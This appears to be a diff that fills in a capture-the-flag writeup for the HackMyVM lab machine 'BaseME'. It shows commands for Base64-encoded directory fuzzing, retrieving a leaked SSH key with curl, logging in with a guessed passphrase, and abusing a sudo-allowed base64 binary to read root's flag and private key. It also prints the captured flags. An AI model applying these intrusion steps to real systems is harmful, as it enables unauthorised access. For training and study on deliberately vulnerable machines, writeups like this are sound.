@@ -1,7 +1,7 @@
 ---
 layout: page
 title: "BaseME - HackMyVM Writeup"
-subtitle: "Complete walkthrough detailing reconnaissance, foothold, and privilege escalation on 🐧 Linux"
+subtitle: "Complete walkthrough detailing Base64 directory fuzzing, private key passphrase extraction, and sudo base64 privilege escalation"
 permalink: /ctf/writeups/hackmyvm/baseme/
 platform: hackmyvm
 machine_name: "BaseME"
@@ -38,19 +38,26 @@ os: Linux
     </div>
     <div class="hmv-meta-col">
       <span class="hmv-meta-label">IP Address</span>
-      <span class="hmv-meta-val" style="font-family: monospace; font-size: 0.95rem;">DHCP</span>
+      <span class="hmv-meta-val" style="font-family: monospace; font-size: 0.95rem;">192.168.56.107</span>
     </div>
   </div>
 </div>
+
 ---
 
 ## 🧠 Attack Path Overview
 
 ```mermaid
 graph TD
-    A["Reconnaissance: Port Scan"] --> B["Foothold: Vulnerability Exploitation"]
-    B --> C["Privilege Escalation: Local Escalation"]
-    C --> D["Full System Compromise: Root/Administrator"]
+    A["Reconnaissance: Nmap Scan & Homepage Base64 string extraction"] --> B["Analysis: Decode Base64 string & identify Lucas comments"]
+    B --> C["Wordlist Prep: Base64 encode directory scan list to match target configuration"]
+    C --> D["Directory Brute Force: Find aWRfcnNhCg== & cm9ib3RzLnR4dAo="]
+    D --> E["Decoding Files: Decode strings to retrieve id_rsa & robots.txt"]
+    E --> F["SSH Passphrase: Base64 encode homepage comment 'iloveyou' -> 'aWxvdmV5b3UK'"]
+    F --> G["Foothold: Login as lucas using SSH key & decrypted passphrase"]
+    G --> H["Privilege Escalation: Abuse Sudo rights to run base64 as root"]
+    H --> I["Root Flag: Read root.txt or root id_rsa key using base64"]
+    I --> J["Root Access: Complete system compromise"]
 ```
 
 > [!NOTE]
@@ -61,78 +68,152 @@ graph TD
 ## 🔍 Phase 1: Reconnaissance & Enumeration
 
 ### 1. Host Discovery & Port Scanning
-We begin by running a standard Nmap scan to discover open ports and running services:
+We scan the host using Nmap to identify open services:
 
 ```bash
-nmap -sC -sV -oN nmap.txt DHCP
+nmap -p- -sC -sV 192.168.56.107
 ```
 
 #### Open Ports:
-- **Port 80/tcp**: Web Server (Apache/Nginx)
-- **Port 22/tcp**: SSH (OpenSSH)
-- [Other open ports]
+```text
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+80/tcp open  http    nginx 1.14.2
+```
 
-### 2. Service Enumeration
-[Detail the enumeration steps, e.g., gobuster, nikto, smbclient, enum4linux, rpcclient]
+### 2. Web Service Enumeration
+Accessing the web server home page on port 80 returns a raw Base64 string:
 
+```text
+QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK
+```
+
+We decode it:
 ```bash
-gobuster dir -u http://DHCP/ -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt
+echo "QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK" | base64 -d
+```
+
+```text
+ALL, absolutely ALL that you need is in BASE64.
+Including the password that you need :)
+Remember, BASE64 has the answer to all your questions.
+-lucas
+```
+
+We also inspect the HTML source of the page and find the following comments:
+```html
+<!--
+iloveyou
+youloveyou
+shelovesyou
+helovesyou
+weloveyou
+theyhatesme
+-->
 ```
 
 ---
 
 ## 🚀 Phase 2: Vulnerability Analysis & Foothold
 
-### 1. Vulnerability Analysis
-- [State the vulnerability found and how it was discovered]
-- **CVE/CWE Reference**: [e.g., CVE-202X-XXXX]
+### 1. Custom Base64 Fuzzing Wordlist
+Standard directory scanners yield nothing because the directories are named using Base64 strings. We need to Base64 encode each line in a standard wordlist to perform a brute-force scan.
 
-### 2. Exploitation & Initial Shell
-- [Detail the step-by-step exploitation process to gain a shell]
+We can run a Bash script to generate a Base64-encoded dictionary:
 
 ```bash
-# Example payload or exploit execution command
-python3 exploit.py -t http://DHCP/vulnerable-endpoint
+while IFS= read -r line
+do
+   echo "$line" | base64 >> dic-base64.txt
+done < directory-list-2.3-medium.txt
 ```
 
-#### Capturing User Flag:
+### 2. Directory Fuzzing
+Using our custom encoded dictionary `dic-base64.txt`, we perform a directory scan using `dirsearch`:
+
 ```bash
-cat /home/*/user.txt
-# [User Flag Hash]
+dirsearch -w dic-base64.txt -u http://192.168.56.107/
 ```
+
+```text
+[11:09:02] 200 -    2KB - /aWRfcnNhCg==
+[11:09:03] 200 -   25B  - /cm9ib3RzLnR4dAo=
+```
+
+We decode the returned paths:
+* `aWRfcnNhCg==` ➡️ `id_rsa`
+* `cm9ib3RzLnR4dAo=` ➡️ `robots.txt`
+
+We download `/aWRfcnNhCg==` and base64 decode it to retrieve Lucas's SSH private key (`id_rsa`):
+
+```bash
+curl -s http://192.168.56.107/aWRfcnNhCg== | base64 -d > id_rsa
+chmod 600 id_rsa
+```
+
+### 3. Cracking SSH Passphrase
+Attempting to log in using the SSH key prompts us for a passphrase:
+
+```bash
+ssh lucas@192.168.56.107 -i id_rsa
+```
+
+Recalling the clue `"BASE64 has the answer to all your questions"`, we Base64 encode the comments found in the HTML source code:
+* `iloveyou` ➡️ `aWxvdmV5b3UK`
+
+Using `aWxvdmV5b3UK` as the SSH key passphrase allows us to connect successfully.
+
+```text
+Linux baseme 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
+lucas@baseme:~$ 
+```
+
+We retrieve the user flag:
+```bash
+cat /home/lucas/user.txt
+```
+Output: `HMV8nnJAJAJA`
 
 ---
 
 ## ⚡ Phase 3: Privilege Escalation
 
-### 1. Local Enumeration
-- [Detail tools and commands run, e.g., linpeas, winpeas, sudo -l, find SUID]
+### 1. Exploiting Sudo Permissions
+We check our sudo privileges:
 
 ```bash
-# Check sudo permissions
 sudo -l
-
-# Search for SUID binaries
-find / -perm -4000 2>/dev/null
 ```
 
-### 2. Local Privilege Escalation Path
-- [Step-by-step instructions to escalate privileges to root/administrator]
+Output:
+```text
+Matching Defaults entries for lucas on baseme:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User lucas may run the following commands on baseme:
+    (ALL) NOPASSWD: /usr/bin/base64
+```
+
+We can run `/usr/bin/base64` as root without a password. Since `base64` can read files, we can perform an arbitrary file read vulnerability to retrieve protected root files.
+
+### 2. Reading Root Flag and SSH Key
+We read the root flag using the base64 command:
 
 ```bash
-# Example privilege escalation exploit or command
-sudo /usr/bin/binary -e 'exec /bin/sh'
+sudo base64 /root/root.txt | base64 -d
 ```
+Output: `HMVFKBS64`
 
-#### Capturing Root Flag:
+### 3. Alternative: Full Shell Takeover
+We can also read the root user's private SSH key to log in directly:
+
 ```bash
-cat /root/root.txt
-# [Root Flag Hash]
+sudo base64 /root/.ssh/id_rsa | base64 -d > id_rsa_root
+chmod 600 id_rsa_root
+ssh root@192.168.56.107 -i id_rsa_root
 ```
 
----
-
-## 🛡️ Key Takeaways & Mitigation
-1. **Input Sanitization**: Ensure all user inputs are validated and sanitized.
-2. **Principle of Least Privilege**: Restrict sudo permissions and remove unnecessary SUID bits.
-3. **Keep Software Updated**: Patch services to mitigate known CVEs.
+```text
+root@baseme:~# whoami
+root
+```
